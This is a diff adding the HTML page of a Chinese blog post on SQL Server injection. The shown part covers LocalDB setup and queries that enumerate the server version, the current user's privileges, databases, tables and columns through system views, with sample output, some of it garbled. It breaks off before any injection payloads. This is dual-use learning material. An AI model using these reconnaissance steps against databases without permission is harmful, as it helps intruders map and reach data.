@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>SQL Server注入 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SQL Server注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">五月 2, 2025&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/sql/">sql</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早之前总结mysql语法和注入技巧，但是后面在实战中遇到了一个iis老系统有mssql注入漏洞，才发现自己不知道该怎么注入和绕过waf。这里只简单介绍sql server的一些特性和注入绕过具体实现。本质上sql server语法和mysql语法差不多。所有这篇文章不会过多介绍一些基础的sql语句</p>
+<span id="more"></span>  
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用 SqlLocalDB 实用工具创建 SQL Server Express LocalDB 的实例,然后navicat连接</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqllocaldb v <span class="comment">#查看版本</span></span><br><span class="line">sqllocaldb create MSSQLLocalDB <span class="comment">#创建数据库,创建后不会自动启动数据库</span></span><br><span class="line">sqllocaldb i <span class="comment">#列出当前用户拥有的所有 SQL Server Express LocalDB 实例</span></span><br><span class="line">SqlLocalDb info MSSQLLocalDB      <span class="comment">#显示数据库信息</span></span><br><span class="line">SqlLocalDB start MSSQLLocalDB     <span class="comment">#启动数据库</span></span><br><span class="line">SqlLocalDB stop MSSQLLocalDB     <span class="comment">#停止MyDatabase数据库 </span></span><br><span class="line">SqlLocalDB delete MSSQLLocalDB   <span class="comment">#删除MyDatabase数据库 </span></span><br></pre></td></tr></table></figure>
+<p>连接主机为<code>(localdb)\MSSQLLocalDB</code>,如果不行,可以通过管道名字进行连接, 管道名称每次重启服务都会变</p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>架构是数据库对象的逻辑容器，用于将数据库中的对象分组并且管理其访问权限。每个架构由一个架构名标识，并且每个数据库对象（如表、视图等）都属于某个架构。可以理解为对数据库下各表进行分组。</p>
+<p>在创建用户时，可以指定该用户的默认架构。如果没有指定，默认是 dbo<br>在 SQL Server 中，dbo（Database Owner） 是最常见的默认架构，所有没有明确指定架构的数据库对象都会自动属于 dbo 架构。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span>  <span class="keyword">from</span> master.dbo.sysdatabases; <span class="comment">--查找master数据库下dbo架构的sysdatabases视图</span></span><br><span class="line"><span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span> master..sysdatabases;    <span class="comment">--查找master数据库下默认架构dbo下的sysdatabases视图</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基本信息查询"><a href="#基本信息查询" class="headerlink" title="基本信息查询"></a>基本信息查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;                   <span class="comment">--版本</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>;		                <span class="comment">--用户</span></span><br><span class="line"><span class="keyword">SELECT</span> DB_NAME();	                <span class="comment">--当前数据库名，你可以用db_name(n)来遍历出所有的数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> host_name();                 <span class="comment">--客户端机器的主机名</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@servername</span>;	            <span class="comment">--返回 SQL Server 实例的名</span></span><br><span class="line"><span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>) <span class="comment">--查看用户权限，返回1则说明是服务器级别角色sysadmin组的成员</span></span><br><span class="line"><span class="keyword">SELECT</span> IS_MEMBER(<span class="string">&#x27;db_owner&#x27;</span>)        <span class="comment">--数据库级别角色db_owner</span></span><br></pre></td></tr></table></figure>
+<p>查看数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>  <span class="keyword">from</span> master.dbo.sysdatabases; <span class="comment">--name为数据库名，且前四个为系统自带库</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> name     dbid   sid   mode   status   status2      crdate                    reserved                  category   cmptlevel   filename                                                                                                  version</span><br><span class="line"><span class="comment">-------- ------ ----- ------ -------- ------------ ------------------------- ------------------------- ---------- ----------- --------------------------------------------------------------------------------------------------------- ---------</span></span><br><span class="line"> master      <span class="number">1</span>           <span class="number">0</span>    <span class="number">65544</span>   <span class="number">1090520064</span>   <span class="number">2003</span><span class="number">-04</span><span class="number">-08</span> <span class="number">09</span>:<span class="number">13</span>:<span class="number">36.390</span>   <span class="number">1900</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>          <span class="number">0</span>         <span class="number">150</span>   C:\Users\DELL\AppData\<span class="keyword">Local</span>\Microsoft\Microsoft <span class="keyword">SQL</span> Server <span class="keyword">Local</span> DB\Instances\MSSQLLocalDB\master.mdf         <span class="number">904</span></span><br><span class="line"> tempdb      <span class="number">2</span>           <span class="number">0</span>    <span class="number">65544</span>   <span class="number">1090520064</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-02</span> <span class="number">18</span>:<span class="number">31</span>:<span class="number">58.970</span>   <span class="number">1900</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>          <span class="number">0</span>         <span class="number">150</span>   C:\Users\DELL\AppData\<span class="keyword">Local</span>\Microsoft\Microsoft <span class="keyword">SQL</span> Server <span class="keyword">Local</span> DB\Instances\MSSQLLocalDB\tempdb.mdf         <span class="number">904</span></span><br><span class="line"> model       <span class="number">3</span>           <span class="number">0</span>    <span class="number">65544</span>   <span class="number">1090519040</span>   <span class="number">2003</span><span class="number">-04</span><span class="number">-08</span> <span class="number">09</span>:<span class="number">13</span>:<span class="number">36.390</span>   <span class="number">1900</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>          <span class="number">0</span>         <span class="number">150</span>   C:\Users\DELL\AppData\<span class="keyword">Local</span>\Microsoft\Microsoft <span class="keyword">SQL</span> Server <span class="keyword">Local</span> DB\Instances\MSSQLLocalDB\model.mdf          <span class="number">904</span></span><br><span class="line"> msdb        <span class="number">4</span>           <span class="number">0</span>    <span class="number">65544</span>   <span class="number">1627390976</span>   <span class="number">2021</span><span class="number">-07</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">10</span>:<span class="number">09.087</span>   <span class="number">1900</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>          <span class="number">0</span>         <span class="number">150</span>   C:\Users\DELL\AppData\<span class="keyword">Local</span>\Microsoft\Microsoft <span class="keyword">SQL</span> Server <span class="keyword">Local</span> DB\Instances\MSSQLLocalDB\MSDBData.mdf       <span class="number">904</span></span><br><span class="line"> test        <span class="number">5</span>           � <span class="number">0</span>�</span><br><span class="line">�C2x���         <span class="number">0</span>    <span class="number">65545</span>   <span class="number">1627389952</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">14</span>:<span class="number">57.960</span>   <span class="number">1900</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>          <span class="number">0</span>         <span class="number">150</span>   C:\Users\DELL\test.mdf </span><br></pre></td></tr></table></figure>
+<h3 id="mssql如何查找表信息"><a href="#mssql如何查找表信息" class="headerlink" title="mssql如何查找表信息"></a>mssql如何查找表信息</h3><h4 id="sysobjects-视图"><a href="#sysobjects-视图" class="headerlink" title="sysobjects 视图"></a>sysobjects 视图</h4><p>sysobjects 是 SQL Server 中的一个旧版系统表，虽然它在 SQL Server 中仍然可用，但已经逐渐被新的视图（如 sys.all_objects）所取代</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>; <span class="comment">--U代表用户创建的表,NAME字段为表名</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> name    id          xtype   uid   info   status   base_schema_ver   replinfo   parent_obj   crdate                    ftcatid   schema_ver   stats_schema_ver   type   userstat   sysstat   indexdel   refdate                   version   deltrig   instrig   updtrig   seltrig   category   cache</span><br><span class="line"><span class="comment">------- ----------- ------- ----- ------ -------- ----------------- ---------- ------------ ------------------------- --------- ------------ ------------------ ------ ---------- --------- ---------- ------------------------- --------- --------- --------- --------- --------- ---------- -------</span></span><br><span class="line"> test1   <span class="number">885578193</span>   U         <span class="number">1</span>      <span class="number">0</span>        <span class="number">0</span>                 <span class="number">0</span>          <span class="number">0</span>            <span class="number">0</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">02.313</span>         <span class="number">0</span>            <span class="number">0</span>                  <span class="number">0</span>   U             <span class="number">1</span>         <span class="number">3</span>          <span class="number">0</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">02.313</span>         <span class="number">0</span>         <span class="number">0</span>         <span class="number">0</span>         <span class="number">0</span>         <span class="number">0</span>          <span class="number">0</span>       <span class="number">0</span></span><br><span class="line"> test2   <span class="number">917578307</span>   U         <span class="number">1</span>      <span class="number">0</span>        <span class="number">0</span>                 <span class="number">0</span>          <span class="number">0</span>            <span class="number">0</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">38.830</span>         <span class="number">0</span>            <span class="number">0</span>                  <span class="number">0</span>   U             <span class="number">1</span>         <span class="number">3</span>          <span class="number">0</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">38.830</span>         <span class="number">0</span>         <span class="number">0</span>         <span class="number">0</span>         <span class="number">0</span>         <span class="number">0</span>          <span class="number">0</span>       <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span><span class="number">885578193</span>; <span class="comment">--通过上表获取到的表名对应的id，在syscolumns中获取列名</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> name   id          xtype   typestat   xusertype   length   xprec   xscale   colid   xoffset   bitpos   reserved   colstat   cdefault   domain   number   colorder   autoval   <span class="keyword">offset</span>   collationid   <span class="keyword">language</span>   status   type   usertype   printfmt   prec   scale   iscomputed   isoutparam   isnullable   <span class="keyword">collation</span>                      tdscollation</span><br><span class="line"><span class="comment">------ ----------- ------- ---------- ----------- -------- ------- -------- ------- --------- -------- ---------- --------- ---------- -------- -------- ---------- --------- -------- ------------- ---------- -------- ------ ---------- ---------- ------ ------- ------------ ------------ ------------ ------------------------------ --------------</span></span><br><span class="line"> id     <span class="number">885578193</span>      <span class="number">56</span>          <span class="number">1</span>          <span class="number">56</span>        <span class="number">4</span>      <span class="number">10</span>        <span class="number">0</span>       <span class="number">1</span>         <span class="number">0</span>        <span class="number">0</span>          <span class="number">0</span>         <span class="number">0</span>          <span class="number">0</span>        <span class="number">0</span>        <span class="number">0</span>          <span class="number">1</span>   <span class="keyword">NULL</span>           <span class="number">2</span>             <span class="number">0</span>          <span class="number">0</span>        <span class="number">0</span>     <span class="number">56</span>          <span class="number">7</span>   <span class="keyword">NULL</span>         <span class="number">10</span>       <span class="number">0</span>            <span class="number">0</span>            <span class="number">0</span>            <span class="number">0</span>   <span class="keyword">NULL</span></span><br><span class="line"> name   <span class="number">885578193</span>     <span class="number">167</span>          <span class="number">2</span>         <span class="number">167</span>      <span class="number">100</span>       <span class="number">0</span>        <span class="number">0</span>       <span class="number">2</span>         <span class="number">0</span>        <span class="number">0</span>          <span class="number">0</span>         <span class="number">0</span>          <span class="number">0</span>        <span class="number">0</span>        <span class="number">0</span>          <span class="number">2</span>   <span class="keyword">NULL</span>          <span class="number">-1</span>     <span class="number">872468488</span>          <span class="number">0</span>       <span class="number">24</span>     <span class="number">39</span>          <span class="number">2</span>   <span class="keyword">NULL</span>        <span class="number">100</span>   <span class="keyword">NULL</span>             <span class="number">0</span>            <span class="number">0</span>            <span class="number">1</span>   SQL_Latin1_General_CP1_CI_AS   	� <span class="number">4</span></span><br><span class="line"> age    <span class="number">885578193</span>      <span class="number">56</span>          <span class="number">0</span>          <span class="number">56</span>        <span class="number">4</span>      <span class="number">10</span>        <span class="number">0</span>       <span class="number">3</span>         <span class="number">0</span>        <span class="number">0</span>          <span class="number">0</span>         <span class="number">0</span>          <span class="number">0</span>        <span class="number">0</span>        <span class="number">0</span>          <span class="number">3</span>   <span class="keyword">NULL</span>          <span class="number">-2</span>             <span class="number">0</span>          <span class="number">0</span>        <span class="number">8</span>     <span class="number">38</span>          <span class="number">7</span>   <span class="keyword">NULL</span>         <span class="number">10</span>       <span class="number">0</span>            <span class="number">0</span>            <span class="number">0</span>            <span class="number">1</span>   <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
+<h4 id="sys-all-objects-视图"><a href="#sys-all-objects-视图" class="headerlink" title="sys.all_objects 视图"></a>sys.all_objects 视图</h4><p>sys.all_objects 是一个较新的系统视图，提供了更细粒度的对象信息，并且适用于 SQL Server 2005 及更高版本,但是对于我们而言这俩表没什么不一样的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sys.all_objects <span class="keyword">WHERE</span> type<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>;</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> name                  object_id    principal_id   schema_id   parent_object_id   type   type_desc    create_date               modify_date               is_ms_shipped   is_published   is_schema_published</span><br><span class="line"><span class="comment">--------------------- ------------ -------------- ----------- ------------------ ------ ------------ ------------------------- ------------------------- --------------- -------------- ---------------------</span></span><br><span class="line"> trace_xe_action_map   <span class="number">-463397375</span>   <span class="keyword">NULL</span>                   <span class="number">4</span>                  <span class="number">0</span>   U      USER_TABLE   <span class="number">2021</span><span class="number">-07</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">08</span>:<span class="number">42.057</span>   <span class="number">2021</span><span class="number">-07</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">08</span>:<span class="number">42.067</span>   <span class="number">1</span>               <span class="number">0</span>              <span class="number">0</span></span><br><span class="line"> trace_xe_event_map    <span class="number">-319884821</span>   <span class="keyword">NULL</span>                   <span class="number">4</span>                  <span class="number">0</span>   U      USER_TABLE   <span class="number">2021</span><span class="number">-07</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">08</span>:<span class="number">41.990</span>   <span class="number">2021</span><span class="number">-07</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">08</span>:<span class="number">42.000</span>   <span class="number">1</span>               <span class="number">0</span>              <span class="number">0</span></span><br><span class="line"> test1                  <span class="number">885578193</span>   <span class="keyword">NULL</span>                   <span class="number">1</span>                  <span class="number">0</span>   U      USER_TABLE   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">02.313</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">02.313</span>   <span class="number">0</span>               <span class="number">0</span>              <span class="number">0</span></span><br><span class="line"> test2                  <span class="number">917578307</span>   <span class="keyword">NULL</span>                   <span class="number">1</span>                  <span class="number">0</span>   U      USER_TABLE   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">38.830</span>   <span class="number">2025</span><span class="number">-05</span><span class="number">-03</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">38.830</span>   <span class="number">0</span>               <span class="number">0</span>              <span class="number">0</span></span><br><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sys.all_columns <span class="keyword">where</span> object_id<span class="operator">=</span><span class="string">&#x27;885578193&#x27;</span>;<span class="comment">--在name中获取列名</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> object_id   name   column_id   system_type_id   user_type_id   max_length   <span class="keyword">precision</span>   scale   collation_name                 is_nullable   is_ansi_padded   is_rowguidcol   is_identity   is_computed   is_filestream   is_replicated   is_non_sql_subscribed   is_merge_published   is_dts_replicated   is_xml_document   xml_collection_id   default_object_id   rule_object_id   is_sparse   is_column_set   generated_always_type   generated_always_type_desc   encryption_type   encryption_type_desc   encryption_algorithm_name   column_encryption_key_id   column_encryption_key_database_name   is_hidden   is_masked   graph_type   graph_type_desc</span><br><span class="line"><span class="comment">----------- ------ ----------- ---------------- -------------- ------------ ----------- ------- ------------------------------ ------------- ---------------- --------------- ------------- ------------- --------------- --------------- ----------------------- -------------------- ------------------- ----------------- ------------------- ------------------- ---------------- ----------- --------------- ----------------------- ---------------------------- ----------------- ---------------------- --------------------------- -------------------------- ------------------------------------- ----------- ----------- ------------ -----------------</span></span><br><span class="line"> <span class="number">885578193</span>   id             <span class="number">1</span>               <span class="number">56</span>             <span class="number">56</span>            <span class="number">4</span>          <span class="number">10</span>       <span class="number">0</span>   <span class="keyword">NULL</span>                           <span class="number">0</span>             <span class="number">0</span>                <span class="number">0</span>               <span class="number">0</span>             <span class="number">0</span>             <span class="number">0</span>               <span class="number">0</span>               <span class="number">0</span>                       <span class="number">0</span>                    <span class="number">0</span>                   <span class="number">0</span>                                 <span class="number">0</span>                   <span class="number">0</span>                <span class="number">0</span>   <span class="number">0</span>           <span class="number">0</span>                                   <span class="number">0</span>   NOT_APPLICABLE               <span class="keyword">NULL</span>              <span class="keyword">NULL</span>                   <span class="keyword">NULL</span>                        <span class="keyword">NULL</span>                       <span class="keyword">NULL</span>                                  <span class="number">0</span>           <span class="number">0</span>           <span class="keyword">NULL</span>         <span class="keyword">NULL</span></span><br><span class="line"> <span class="number">885578193</span>   name           <span class="number">2</span>              <span class="number">167</span>            <span class="number">167</span>          <span class="number">100</span>           <span class="number">0</span>       <span class="number">0</span>   SQL_Latin1_General_CP1_CI_AS   <span class="number">1</span>             <span class="number">1</span>                <span class="number">0</span>               <span class="number">0</span>             <span class="number">0</span>             <span class="number">0</span>               <span class="number">0</span>               <span class="number">0</span>                       <span class="number">0</span>                    <span class="number">0</span>                   <span class="number">0</span>                                 <span class="number">0</span>                   <span class="number">0</span>                <span class="number">0</span>   <span class="number">0</span>           <span class="number">0</span>                                   <span class="number">0</span>   NOT_APPLICABLE               <span class="keyword">NULL</span>              <span class="keyword">NULL</span>                   <span class="keyword">NULL</span>                        <span class="keyword">NULL</span>                       <span class="keyword">NULL</span>                                  <span class="number">0</span>           <span class="number">0</span>           <span class="keyword">NULL</span>         <span class="keyword">NULL</span></span><br><span class="line"> <span class="number">885578193</span>   age            <span class="number">3</span>               <span class="number">56</span>             <span class="number">56</span>            <span class="number">4</span>          <span class="number">10</span>       <span class="number">0</span>   <span class="keyword">NULL</span>                           <span class="number">1</span>             <span class="number">0</span>                <span class="number">0</span>               <span class="number">0</span>             <span class="number">0</span>             <span class="number">0</span>               <span class="number">0</span>               <span class="number">0</span>                       <span class="number">0</span>                    <span class="number">0</span>                   <span class="number">0</span>                                 <span class="number">0</span>                   <span class="number">0</span>                <span class="number">0</span>   <span class="number">0</span>           <span class="number">0</span>                                   <span class="number">0</span>   NOT_APPLICABLE               <span class="keyword">NULL</span>              <span class="keyword">NULL</span>                   <span class="keyword">NULL</span>                        <span class="keyword">NULL</span>                       <span class="keyword">NULL</span>                                  <span class="number">0</span>           <span class="number">0</span>           <span class="keyword">NULL</span>         <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="INFORMATION-SCHEMA视图"><a href="#INFORMATION-SCHEMA视图" class="headerlink" title="INFORMATION_SCHEMA视图"></a>INFORMATION_SCHEMA视图</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> INFORMATION_SCHEMA.TABLES; <span class="comment">--TABLE_NAME为表名</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE</span><br><span class="line"><span class="comment">--------------- -------------- ------------ ------------</span></span><br><span class="line"> test            dbo            test1        BASE <span class="keyword">TABLE</span></span><br><span class="line"> test            dbo            test2        BASE <span class="keyword">TABLE</span></span><br><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;test1&#x27;</span>; <span class="comment">--COLUMN_NAME为表名</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> go</span><br><span class="line"> TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   COLUMN_NAME   ORDINAL_POSITION   COLUMN_DEFAULT   IS_NULLABLE   DATA_TYPE   CHARACTER_MAXIMUM_LENGTH   CHARACTER_OCTET_LENGTH   NUMERIC_PRECISION   NUMERIC_PRECISION_RADIX   NUMERIC_SCALE   DATETIME_PRECISION   CHARACTER_SET_CATALOG   CHARACTER_SET_SCHEMA   CHARACTER_SET_NAME   COLLATION_CATALOG   COLLATION_SCHEMA   COLLATION_NAME                 DOMAIN_CATALOG   DOMAIN_SCHEMA   DOMAIN_NAME</span><br><span class="line"><span class="comment">--------------- -------------- ------------ ------------- ------------------ ---------------- ------------- ----------- -------------------------- ------------------------ ------------------- ------------------------- --------------- -------------------- ----------------------- ---------------------- -------------------- ------------------- ------------------ ------------------------------ ---------------- --------------- -------------</span></span><br><span class="line"> test            dbo            test1        id                           <span class="number">1</span>   <span class="keyword">NULL</span>             <span class="keyword">NO</span>            <span class="type">int</span>         <span class="keyword">NULL</span>                       <span class="keyword">NULL</span>                                    <span class="number">10</span>                        <span class="number">10</span>               <span class="number">0</span>   <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>                    <span class="keyword">NULL</span>                   <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>                <span class="keyword">NULL</span>               <span class="keyword">NULL</span>                           <span class="keyword">NULL</span>             <span class="keyword">NULL</span>            <span class="keyword">NULL</span></span><br><span class="line"> test            dbo            test1        name                         <span class="number">2</span>   <span class="keyword">NULL</span>             YES           <span class="type">varchar</span>                          <span class="number">100</span>                      <span 